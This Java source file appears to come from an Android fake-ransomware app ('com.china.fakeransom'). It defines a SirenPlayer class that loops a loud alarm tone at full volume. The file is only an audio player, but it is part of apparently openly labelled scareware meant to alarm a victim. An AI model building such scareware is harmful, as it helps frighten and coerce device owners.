package com.china.fakeransom;

import android.media.AudioAttributes;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioTrack;

final class SirenPlayer {

    private AudioTrack track;

    synchronized void start() {
        if (track != null) {
            resumePlaying();
            return;
        }
        try {
            int sampleRate = 8000;
            int seconds = 3;
            int frames = sampleRate * seconds;
            short[] pcm = new short[frames];
            for (int i = 0; i < frames; i++) {
                double t = i / (double) sampleRate;
                double f = 520 + 260 * Math.sin(2 * Math.PI * t / 1.2);
                double v = Math.sin(2 * Math.PI * f * t);
                pcm[i] = (short) (Math.signum(v) * 21000);
            }
            AudioAttributes attrs = new AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_ALARM)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                    .build();
            AudioFormat fmt = new AudioFormat.Builder()
                    .setSampleRate(sampleRate)
                    .setEncoding(AudioFormat.ENCODING_PCM_16BIT)
                    .setChannelMask(AudioFormat.CHANNEL_OUT_MONO)
                    .build();
            track = new AudioTrack(attrs, fmt, frames * 2, AudioTrack.MODE_STATIC,
                    AudioManager.AUDIO_SESSION_ID_GENERATE);
            track.write(pcm, 0, frames);
            track.setLoopPoints(0, frames, -1);
            track.setVolume(1.0f);
            track.play();
        } catch (Throwable t) {
            track = null;
        }
    }

    synchronized void pause() {
        if (track != null) {
            try {
                track.pause();
            } catch (Throwable ignored) {
            }
        }
    }

    synchronized void resumePlaying() {
        if (track != null) {
            try {
                track.play();
            } catch (Throwable ignored) {
            }
        }
    }

    synchronized void stop() {
        if (track != null) {
            try {
                track.stop();
                track.release();
            } catch (Throwable ignored) {
            }
            track = null;
        }
    }
}
